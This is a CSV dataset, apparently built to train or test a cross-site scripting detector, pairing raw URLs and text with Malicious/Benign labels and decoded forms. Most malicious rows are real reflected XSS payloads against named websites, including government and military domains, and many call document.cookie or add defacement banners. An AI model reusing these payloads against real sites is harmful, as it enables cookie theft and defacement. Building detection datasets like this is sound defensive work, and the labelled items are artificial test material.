Payloads,Class,decoded,executed,parser_changed
http://de.motorrad.cars.yahoo.net/nuovo/moto/marca.php3?modello=&quot;&gt;&lt;script&gt;alert(/nemessis-www.rstzon<br>e.org/)&lt;/script&gt;&amp;marca=piaggio,Malicious,"http://de.motorrad.cars.yahoo.net/nuovo/moto/marca.php3?modello=""><script>alert(/nemessis-www.rstzone.org/)</script>&marca=piaggio",True,True
http://pownce.com/add_friends/query/%253c%252fscript%253e%253cscript%253ealert%2528%2527xss%2527%252<br>9%253c%252fscript%253e/,Malicious,http://pownce.com/add_friends/query/</script><script>alert('xss')</script>/,True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mildrid&password=degenera%21tiva&nombre=ada&apellidos=libano+parramon&email=key%40convenci%f3nes.gi&dni=46594766d&direccion=arnau+d%27oms%2c+2+&ciudad=bermillo+de+sayago&cp=23530&provincia=cuenca&ntc=8145247630144584&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mildrid&password=degenera!tiva&nombre=ada&apellidos=libano parramon&email=key@convenci�nes.gi&dni=46594766d&direccion=arnau d'oms, 2 &ciudad=bermillo de sayago&cp=23530&provincia=cuenca&ntc=8145247630144584&b1=registrar",False,False
http://www.verdimaddaloni.it/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.verdimaddaloni.it/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.gptcashcow.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.gptcashcow.com/members/register.php?ref=""><script>alert(document.cookie);</script>",True,True
http://www.wikihow.com/be-like-the-girls-from-dance-moms&t=1396534299975&n=1153493&k=mainentity,Benign,http://www.wikihow.com/be-like-the-girls-from-dance-moms&t=1396534299975&n=1153493&k=mainentity,False,False
http://sourceforge.net/search/?type_of_search=soft&amp;type_of_search=soft&amp;words=%22%3e%3cscript%3ealert<br>(%22cruelwolf%22)%3c/script%3e,Malicious,"http://sourceforge.net/search/?type_of_search=soft&type_of_search=soft&words=""><script>alert(""cruelwolf"")</script>",True,True
http://www.csd.auth.gr/studies/info.en.php?id=systhmata_gnwshs&quot;&gt;&lt;script&gt;alert(/kernel_panic/)&lt;/scrip<br>t&gt;,Malicious,"http://www.csd.auth.gr/studies/info.en.php?id=systhmata_gnwshs""><script>alert(/kernel_panic/)</script>",True,True
"great for a city break my husband, daughter (10) and i went for a short break to barcelona. the covadonga was clean, friendly and ideal as a base. it is a 2minute walk to the bus stop for both routes on the bus touristic which takes you around all of the barcelona sights. the room decor was a little",Benign,"great for a city break my husband, daughter (10) and i went for a short break to barcelona. the covadonga was clean, friendly and ideal as a base. it is a 2minute walk to the bus stop for both routes on the bus touristic which takes you around all of the barcelona sights. the room decor was a little",False,False
http://www.wikihow.com/build-a-good-army-with-enough-resources-in-age-of-empires-3&t=1396648634376&n=5975527&k=mainentity,Benign,http://www.wikihow.com/build-a-good-army-with-enough-resources-in-age-of-empires-3&t=1396648634376&n=5975527&k=mainentity,False,False
http://www.francesoir.fr/search/apachesolr_search/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.francesoir.fr/search/apachesolr_search/""><script>alert('xss by atm0n3r')</script>",True,True
http://www.hitlist.in/index.php?page=in&amp;id=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://www.hitlist.in/index.php?page=in&id=""><script>alert(1)</script>",True,True
http://www.1732.syzefxis.gov.gr/search.asp?langid=1&amp;searchword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.1732.syzefxis.gov.gr/search.asp?langid=1&searchword=""><script>alert(document.cookie)</script>><marquee><h1>by 20narcoticxs</h1></marquee>",True,True
http://www.wikihow.com/measure-for-a-furniture-cover&t=1396562751578&n=2570028&k=mainentity,Benign,http://www.wikihow.com/measure-for-a-furniture-cover&t=1396562751578&n=2570028&k=mainentity,False,False
"great space for 5 people sharing i meant to write this on our return from new york, sorry! i booked hospitality house after reading trip advisor reviews. there were five family members in total 4 female and 1 male. hospitality house was an apartment block in another life, and therefore the rooms were much more spacious than we expected. there was traffic noise (we were pre- warned but it was still a bit of a shock if you haven't been to new york before). we had a 2 bedroomed suite - 1 very large queen size bed, 2 large single beds in the second bedroom and a (double bed width) bed settee in the lounge area. the only negative was that there was only one bathroom and with 5 sharing, we had to wait our turn. the rate included a complimentary breakfast which was more than adequate and it was great to relax over breakfast in the privacy of the suite. great place for a family group who don't mind sharing.",Benign,"great space for 5 people sharing i meant to write this on our return from new york, sorry! i booked hospitality house after reading trip advisor reviews. there were five family members in total 4 female and 1 male. hospitality house was an apartment block in another life, and therefore the rooms were much more spacious than we expected. there was traffic noise (we were pre- warned but it was still a bit of a shock if you haven't been to new york before). we had a 2 bedroomed suite - 1 very large queen size bed, 2 large single beds in the second bedroom and a (double bed width) bed settee in the lounge area. the only negative was that there was only one bathroom and with 5 sharing, we had to wait our turn. the rate included a complimentary breakfast which was more than adequate and it was great to relax over breakfast in the privacy of the suite. great place for a family group who don't mind sharing.",False,False
http://www.wikihow.com/be-a-monotheist&t=1396569596233&n=2911877&k=mainentity,Benign,http://www.wikihow.com/be-a-monotheist&t=1396569596233&n=2911877&k=mainentity,False,False
http://www.bbq.com/picviewer.html?image=http://vuln.xssed.net/thirdparty/scripts/python5.gif&amp;item_id<br>=494&amp;item_name=meco%20smokers%20-%205030%20black%20electric%20smoker%20%27%22%3e%3c/title%3e%3cscrip<br>t%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3eand%20g<br>rill,Malicious,"http://www.bbq.com/picviewer.html?image=http://vuln.xssed.net/thirdparty/scripts/python5.gif&item_id=494&item_name=meco smokers - 5030 black electric smoker '""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>and grill",True,True
http://bloodhacker.forumup.com/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%<br>3e,Malicious,"http://bloodhacker.forumup.com/directory.php?cat=""><script>alert(document.cookie)</script>",True,True
http://www.peryonege.org.tr/galery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.peryonege.org.tr/galery/login.asp?folder=&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://freedom.ws/index.dhtml?sponsor=%22%3e%3cscript%3ealert(%22fux0r%22)%3c/script%3e,Malicious,"http://freedom.ws/index.dhtml?sponsor=""><script>alert(""fux0r"")</script>",True,True
http://www.vgb.no/search.php?p=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.vgb.no/search.php?p=""><script>alert(""maxwel"")</script>",True,True
http://www.bali.co.rs/portal/index.php?cont=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e.htm,Malicious,"http://www.bali.co.rs/portal/index.php?cont=><script>alert(""xss"")</script>.htm",True,True
http://w105.rayfile.com/proc/link.php?url=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://w105.rayfile.com/proc/link.php?url=""><script>alert(document.cookie)</script>",True,True
http://www.volleyball.com/cart.asp?cat=0ssi3&amp;pagenum=&quot;&gt;&lt;script&gt;alert('zuhaha+0ssi3_tr')&lt;/script&gt;,Malicious,"http://www.volleyball.com/cart.asp?cat=0ssi3&pagenum=""><script>alert('zuhaha 0ssi3_tr')</script>",True,True
"ok stay my friend and i stayed at the hilton 3/7 and 3/8 for its convenience to universal studios. this is a long one!let me start off with the positive points:the staff (all that we encountered) were very helpful and friendly. we arrived late (about 12 am) due to a delayed flight, so there wasn't anyone else checking in...no complaints there, the process was fast and easy. we had room 1767 which had a beautiful view of the mountains, valley and also overlooked universal city walk. beds were comfortable, although the pillows were a bit too poofy for me, but it's all a matter of preference. the shuttle to universal runs every 15 minutes like clockwork and we (luckily) never had to wait more than 5 minutes for it. saturday night the 7:30 shuttle was packed (it picks up people at the sheraton too), so some people had to stand, but it's only about a 5 minute ride (if that long) to the park. there was a 7:45 concert at the gibson amphitheatre that night, so i'm sure that had something to do with the full bus. the down side is that the shuttle stops at 10pm, but city walk night clubs are open until 2 or 2:30 am. there is a taxi stop at the front of city walk. they charge $10.00 to go up the hill...pricey, but worth it if you're in heels and/or have had a few drinks!. otherwise, the hotel is walkable. the negative points were:bathtub/shower and sink had a very sluggish drain, not totally stopped up, just slow. i thought the plug was down, but it wasn't. the bathtub faucet constantly ran unless you used force to turn the water off. however, when doing that you notice that the fixture is loose (probably from everyone trying to shut off the water!)...was a bit disappointed in this as i'm sure housekeeping would be aware of this and report it. the bar had my liqueur (yay), but only one bottle!! when they ran out (i didn't drink it all...only had two drinks...really!!!), that was it. i would think they would have had another in reserve if the one they had was low. a minor issue though. after a day at universal, we returned to our room at about 4pm to rest up and get ready for dinner and the concert, but our room was still not made up. we found the housekeeper and she explained that they had to clean the vacant rooms first. we said ok, told her she didn't need to make up our room and just asked for coffee supplies and fresh facecloths hand towels. another minor issue. the biggest gripe i have is with the restaurant there. we went downstairs for dinner a little before 6pm. since there was a long line for the seafood buffet, we decided to dine off the menu. we (mistakenly) thought it would be faster since the buffet food was already prepared and the wait staff only had to do maintenance since everyone was serving themselves. we figured an hour +/- was sufficient to be done with dinner and get the shuttle to the concert (we weren't planning on eating a big meal).we were seated right away (by this time about 6:05) and we each ordered a drink. then at about 6:10 another waitperson came over and we ordered two shrimp cocktail appetizers and two caesar salads (one chicken and one shrimp), thinking a salad could be prepared pretty quick. at about 6:20 the waitperson came back and that's when i found out there was no more of my liqueur, so i ordered a glass of wine. drinks (one rum coke a glass of wine) arrived around 6:35. appetizers arrived at about the same time as the salads, approximately 6:45. the chicken and the shrimp were very dry. all in all, extremely dissappointing for a bill that ended up being a little over $80.00!!! sorry, but i have to continue...next morning before checkout we thought we would try the breakfast...again we avoided the buffet as we're not big eaters and the buffet was $18.00 per person. ordering off the menu was a bit cheaper....so-o-o-o-o we ordered the 2 eggs with bacon, hasbrowns and toast (simple). i asked for eggs scrambled well. i received runny eggs and burned bacon. my friend received burned bacon and burnt toast. the waiter didn't come right back to see how things were, so we muddled through it, not really enjoying it, but too tired by this point to fuss (probably a mistake). when we ate just about all we could stomach, the waiter finally came back to serve a refill of our coffee and asked how everything was. i said not too good. he immediately said something like oh the bacon wasn't too good was it and that he would get some better bacon...i said don't bother, we're done...but off he ran...came back a little while later with bacon the way it should have been. what irked me is that he obviously seemed to know when he served us that the bacon wasn't acceptable. we didn't even want the new bacon, and didn't eat it. we just asked for the bill. the waiter credited us for the bacon. he was a very friendly person and seemed to want to help us, but maybe a bit overwhelmed?...i'm not sure. sorry for the long story, but i'm not a picky person, and can tolerate some inconveniences. however, for the price we paid for the room (including tax approx $230.00 per night), and the rather inflated price of the meals, i would expect better quality. if i had to do it again though...i would probably stay there for the mere convenience of it. the hotel itself is very nice. i would just steer clear of the restaurant, and hope for a room with better plumbing!",Benign,"ok stay my friend and i stayed at the hilton 3/7 and 3/8 for its convenience to universal studios. this is a long one!let me start off with the positive points:the staff (all that we encountered) were very helpful and friendly. we arrived late (about 12 am) due to a delayed flight, so there wasn't anyone else checking in...no complaints there, the process was fast and easy. we had room 1767 which had a beautiful view of the mountains, valley and also overlooked universal city walk. beds were comfortable, although the pillows were a bit too poofy for me, but it's all a matter of preference. the shuttle to universal runs every 15 minutes like clockwork and we (luckily) never had to wait more than 5 minutes for it. saturday night the 7:30 shuttle was packed (it picks up people at the sheraton too), so some people had to stand, but it's only about a 5 minute ride (if that long) to the park. there was a 7:45 concert at the gibson amphitheatre that night, so i'm sure that had something to do with the full bus. the down side is that the shuttle stops at 10pm, but city walk night clubs are open until 2 or 2:30 am. there is a taxi stop at the front of city walk. they charge $10.00 to go up the hill...pricey, but worth it if you're in heels and/or have had a few drinks!. otherwise, the hotel is walkable. the negative points were:bathtub/shower and sink had a very sluggish drain, not totally stopped up, just slow. i thought the plug was down, but it wasn't. the bathtub faucet constantly ran unless you used force to turn the water off. however, when doing that you notice that the fixture is loose (probably from everyone trying to shut off the water!)...was a bit disappointed in this as i'm sure housekeeping would be aware of this and report it. the bar had my liqueur (yay), but only one bottle!! when they ran out (i didn't drink it all...only had two drinks...really!!!), that was it. i would think they would have had another in reserve if the one they had was low. a minor issue though. after a day at universal, we returned to our room at about 4pm to rest up and get ready for dinner and the concert, but our room was still not made up. we found the housekeeper and she explained that they had to clean the vacant rooms first. we said ok, told her she didn't need to make up our room and just asked for coffee supplies and fresh facecloths hand towels. another minor issue. the biggest gripe i have is with the restaurant there. we went downstairs for dinner a little before 6pm. since there was a long line for the seafood buffet, we decided to dine off the menu. we (mistakenly) thought it would be faster since the buffet food was already prepared and the wait staff only had to do maintenance since everyone was serving themselves. we figured an hour  /- was sufficient to be done with dinner and get the shuttle to the concert (we weren't planning on eating a big meal).we were seated right away (by this time about 6:05) and we each ordered a drink. then at about 6:10 another waitperson came over and we ordered two shrimp cocktail appetizers and two caesar salads (one chicken and one shrimp), thinking a salad could be prepared pretty quick. at about 6:20 the waitperson came back and that's when i found out there was no more of my liqueur, so i ordered a glass of wine. drinks (one rum coke a glass of wine) arrived around 6:35. appetizers arrived at about the same time as the salads, approximately 6:45. the chicken and the shrimp were very dry. all in all, extremely dissappointing for a bill that ended up being a little over $80.00!!! sorry, but i have to continue...next morning before checkout we thought we would try the breakfast...again we avoided the buffet as we're not big eaters and the buffet was $18.00 per person. ordering off the menu was a bit cheaper....so-o-o-o-o we ordered the 2 eggs with bacon, hasbrowns and toast (simple). i asked for eggs scrambled well. i received runny eggs and burned bacon. my friend received burned bacon and burnt toast. the waiter didn't come right back to see how things were, so we muddled through it, not really enjoying it, but too tired by this point to fuss (probably a mistake). when we ate just about all we could stomach, the waiter finally came back to serve a refill of our coffee and asked how everything was. i said not too good. he immediately said something like oh the bacon wasn't too good was it and that he would get some better bacon...i said don't bother, we're done...but off he ran...came back a little while later with bacon the way it should have been. what irked me is that he obviously seemed to know when he served us that the bacon wasn't acceptable. we didn't even want the new bacon, and didn't eat it. we just asked for the bill. the waiter credited us for the bacon. he was a very friendly person and seemed to want to help us, but maybe a bit overwhelmed?...i'm not sure. sorry for the long story, but i'm not a picky person, and can tolerate some inconveniences. however, for the price we paid for the room (including tax approx $230.00 per night), and the rather inflated price of the meals, i would expect better quality. if i had to do it again though...i would probably stay there for the mere convenience of it. the hotel itself is very nice. i would just steer clear of the restaurant, and hope for a room with better plumbing!",False,False
http://www.wikihow.com/cosplay-marina-kingston&t=1396613667228&n=4823917&k=mainentity,Benign,http://www.wikihow.com/cosplay-marina-kingston&t=1396613667228&n=4823917&k=mainentity,False,False
http://www.vip-dream.com/index.php?lang=fr/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.vip-dream.com/index.php?lang=fr/""><script>alert('xss by atm0n3r')</script>",True,True
http://launchtoday.it.launch.yahoo.com/player/error.asp?edsc=%3e%3cscript%3ealert('bugreport.ir%20xs<br>s%20for%20xssed.com')%3c/script%3e%3c!--&amp;reloaded=1,Malicious,http://launchtoday.it.launch.yahoo.com/player/error.asp?edsc=><script>alert('bugreport.ir xss for xssed.com')</script><!--&reloaded=1,True,True
modo=registro&login=corissa&password=cipresino&nombre=cenobio&apellidos=la+ringa+chinchilla&email=plate%40pecher.mx&dni=16052504e&direccion=torres+quevedo%2c+143+10%3fb&ciudad=casas+de+juan+n%fa%f1ez&cp=31480&provincia=%253cscript%253ealert%2528%2522paros%2522%2529%253b%253c%252fscript%253e&ntc=1974630082144363&b1=registrar,Malicious,"modo=registro&login=corissa&password=cipresino&nombre=cenobio&apellidos=la ringa chinchilla&email=plate@pecher.mx&dni=16052504e&direccion=torres quevedo, 143 10?b&ciudad=casas de juan n��ez&cp=31480&provincia=<script>alert(""paros"");</script>&ntc=1974630082144363&b1=registrar",True,True
http://www.neseek.com/results.php?search=%22%3cscript%3ealert%28%2fst%40r-gaz3r%2f%29%3c%2fscript%3e<br>%3cmarquee%3e%3ch1%3est%40r-gaz3r%3c%2fh1%3e%3c%2fmarquee%3e&amp;submit=search,Malicious,"http://www.neseek.com/results.php?search=""<script>alert(/st@r-gaz3r/)</script><marquee><h1>st@r-gaz3r</h1></marquee>&submit=search",True,True
a pleasant la hyatt experience more photos,Benign,a pleasant la hyatt experience more photos,False,False
http://l2vault.ign.com/index.php?dir=guides&amp;content=commands&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious,"http://l2vault.ign.com/index.php?dir=guides&content=commands""><script>alert(document.cookie)</script>",True,True
http://www.thaiware.com/main/search.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.thaiware.com/main/search.php?keyword=""><script>alert(document.cookie)</script>",True,True
http://www.starbinary.com/ig/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcotic<br>xs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.starbinary.com/ig/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=29&b1=a%f1adir+al+carrito,Benign,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso manchego&precio=85&cantidad=29&b1=a�adir al carrito,False,False
http://www.level3.com/en/search.aspx?searchstr=%22%3e%3cscript%3ealert%28%27xss%20@%20level3%27%29;%<br>3c/script%3e,Malicious,"http://www.level3.com/en/search.aspx?searchstr=""><script>alert('xss @ level3');</script>",True,True
"trç«s bon acceuil showreview(11351888, 'full');",Benign,"trç«s bon acceuil showreview(11351888, 'full');",False,False
http://www.workcover.vic.gov.au/wps/wcm/connect/worksafe/support/search+results?search=x%22%3e%27%3e<br>%3cscript%3ealert%28123%29%3c%2fscript%3e%22,Malicious,"http://www.workcover.vic.gov.au/wps/wcm/connect/worksafe/support/search results?search=x"">'><script>alert(123)</script>""",True,True
http://www.diversitas.org/db/x.php?go=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.diversitas.org/db/x.php?go=""><script>alert(""maxwel"")</script>",True,True
http://www.wikihow.com/have-your-kids-read-books&t=1396527675840&n=842449&k=mainentity,Benign,http://www.wikihow.com/have-your-kids-read-books&t=1396527675840&n=842449&k=mainentity,False,False
http://www.ca.sandia.gov/hitempthermo/cgi-bin/chemkin.cgi?page=results&amp;id=%3cscript%3ealert('i-lande<br>t')%3c/script%3e,Malicious,http://www.ca.sandia.gov/hitempthermo/cgi-bin/chemkin.cgi?page=results&id=<script>alert('i-landet')</script>,True,True
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=junghua&pwd=des4ontento&remember=off&b1=entrar,Benign,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=junghua&pwd=des4ontento&remember=off&b1=entrar,False,False
http://search2.google.cit.nih.gov/search?site=stemcells_cms&amp;client=stemcells_cms_frontend&amp;proxystyle<br>sheet=stemcells_cms_frontend&amp;output=xml_no_dtd&amp;filter=0&amp;restrict=&amp;getfields=&amp;q=%22%22%3e%3e%3c%3c/sc<br>ript%3e%3cimg%20%22%22%22%3e%3cscript%3ealert(/xss/)%3c/script%3e%22%3e%3e%3c%3cbody%20onload=prompt<br>(document.domain)%3e,Malicious,"http://search2.google.cit.nih.gov/search?site=stemcells_cms&client=stemcells_cms_frontend&proxystylesheet=stemcells_cms_frontend&output=xml_no_dtd&filter=0&restrict=&getfields=&q="""">><</script><img """"""><script>alert(/xss/)</script>"">><<body onload=prompt(document.domain)>",True,True
"angular.module(\'toolbelt.strength\', [\'ngsanitize\']) .directive(\'sysstrength\', function() { var requiredcomplexity, requiredcharsets; var labels = [\'success\', \'warning\', \'danger\']; var results = [ { rank: 1, complexity: \'too short\', label: \'danger\' }, { rank: 2, complexity: \'too few character types\', label: \'warning\' }, { rank: 3, complexity: \'very weak\' }, { rank: 4, complexity: \'weak\' }, { rank: 5, complexity: \'poor\' }, { rank: 6, complexity: \'good\' }, { rank: 7, complexity: \'strong\' }, { rank: 8, complexity: \'very strong\' } ]; function haslowercase(string) { return /[a-z]+/.test(string); } function hasuppercase(string) { return /[a-z]+/.test(string); } function hasnumeric(string) { return /[0-9]+/.test(string); } function hasspecial(string) { return /[$-/:-?{-~!\""^_`\\[\\]]/g.test(string); } function getresult(score) { var percentage = (score * 100) / 20; var result = percentage < 20 ? results[2] : percentage < 35 ? results[3] : percentage < 50 ? results[4] : percentage < 65 ? results[5] : percentage < 90 ? results[6] : results[7]; var rankdifference = requiredcomplexity - result.rank; if (rankdifference >= labels.length) { rankdifference = labels.length - 1; } else if (rankdifference < 0) { rankdifference = 0; } result.label = labels[rankdifference]; return result; } return { require: \'ngmodel\', scope: { model: \'=ngmodel\', target: \'@\' }, replace: true, templateurl: \'template/toolbelt/strength.html\', link: function(scope, elem, attrs) { var minlength = parseint(attrs.minlength) || 6; var formctrl = elem.inheriteddata(\""$formcontroller\""); requiredcomplexity = parseint(attrs.complexity) > 8 ? 8 : parseint(attrs.complexity) || 6; requiredcharsets = parseint(attrs.charsets) > 4 ? 4 : parseint(attrs.charsets) || 1; var updatestrength = function(string) { var charsets = 0, score = 0; if(string) { // gain points based on variation of character types if (haslowercase(string)) charsets++; if (hasuppercase(string)) charsets++; if (hasnumeric(string)) charsets++; if (hasspecial(string)) charsets++; // length improves weighting score = charsets * (string.length / 2); // requires a minimum length scope.result = string.length >= minlength ? (requiredcharsets <= charsets ? getresult(score) : results[1]) : results[0]; } else { scope.result = results[0]; } formctrl[scope.target].$setvalidity(\'strength\', requiredcomplexity <= scope.result.rank && requiredcharsets <= charsets); }; scope.$watch(\'model\', updatestrength); } }; });'",Benign,"angular.module(\'toolbelt.strength\', [\'ngsanitize\']) .directive(\'sysstrength\', function() { var requiredcomplexity, requiredcharsets; var labels = [\'success\', \'warning\', \'danger\']; var results = [ { rank: 1, complexity: \'too short\', label: \'danger\' }, { rank: 2, complexity: \'too few character types\', label: \'warning\' }, { rank: 3, complexity: \'very weak\' }, { rank: 4, complexity: \'weak\' }, { rank: 5, complexity: \'poor\' }, { rank: 6, complexity: \'good\' }, { rank: 7, complexity: \'strong\' }, { rank: 8, complexity: \'very strong\' } ]; function haslowercase(string) { return /[a-z] /.test(string); } function hasuppercase(string) { return /[a-z] /.test(string); } function hasnumeric(string) { return /[0-9] /.test(string); } function hasspecial(string) { return /[$-/:-?{-~!\""^_`\\[\\]]/g.test(string); } function getresult(score) { var percentage = (score * 100) / 20; var result = percentage < 20 ? results[2] : percentage < 35 ? results[3] : percentage < 50 ? results[4] : percentage < 65 ? results[5] : percentage < 90 ? results[6] : results[7]; var rankdifference = requiredcomplexity - result.rank; if (rankdifference >= labels.length) { rankdifference = labels.length - 1; } else if (rankdifference < 0) { rankdifference = 0; } result.label = labels[rankdifference]; return result; } return { require: \'ngmodel\', scope: { model: \'=ngmodel\', target: \'@\' }, replace: true, templateurl: \'template/toolbelt/strength.html\', link: function(scope, elem, attrs) { var minlength = parseint(attrs.minlength) || 6; var formctrl = elem.inheriteddata(\""$formcontroller\""); requiredcomplexity = parseint(attrs.complexity) > 8 ? 8 : parseint(attrs.complexity) || 6; requiredcharsets = parseint(attrs.charsets) > 4 ? 4 : parseint(attrs.charsets) || 1; var updatestrength = function(string) { var charsets = 0, score = 0; if(string) { // gain points based on variation of character types if (haslowercase(string)) charsets  ; if (hasuppercase(string)) charsets  ; if (hasnumeric(string)) charsets  ; if (hasspecial(string)) charsets  ; // length improves weighting score = charsets * (string.length / 2); // requires a minimum length scope.result = string.length >= minlength ? (requiredcharsets <= charsets ? getresult(score) : results[1]) : results[0]; } else { scope.result = results[0]; } formctrl[scope.target].$setvalidity(\'strength\', requiredcomplexity <= scope.result.rank && requiredcharsets <= charsets); }; scope.$watch(\'model\', updatestrength); } }; });'",False,False
http://www.dtra.mil/search_results.cfm?querystartrow=11&amp;&amp;queryendrow=20&amp;&amp;searchvar=&quot;&gt;&lt;script&gt;alert('<br>xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.dtra.mil/search_results.cfm?querystartrow=11&&queryendrow=20&&searchvar=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://machaut.uchicago.edu/cgi-bin/roget.sh?word=%3cbr%3e%3cimg%20src=http://www.j2.idv.tw/media/li<br>nux_windows.jpg%3e%3cscript%3ealert('too%20easy')%3c/script%3e,Malicious,http://machaut.uchicago.edu/cgi-bin/roget.sh?word=<br><img src=http://www.j2.idv.tw/media/linux_windows.jpg><script>alert('too easy')</script>,True,True
http://www.ziraimarket.com/main/search_results.asp?words=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.ziraimarket.com/main/search_results.asp?words=""><script>alert(""backdoor"")</script>",True,True
http://www.colossal-cash.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.colossal-cash.com/members/login.php?path=""><script>alert(document.cookie);</script>",True,True
http://www.wikihow.com/have-a-secret-supply-of-sweets-to-yourself&t=1396515693394&n=207885&k=mainentity,Benign,http://www.wikihow.com/have-a-secret-supply-of-sweets-to-yourself&t=1396515693394&n=207885&k=mainentity,False,False
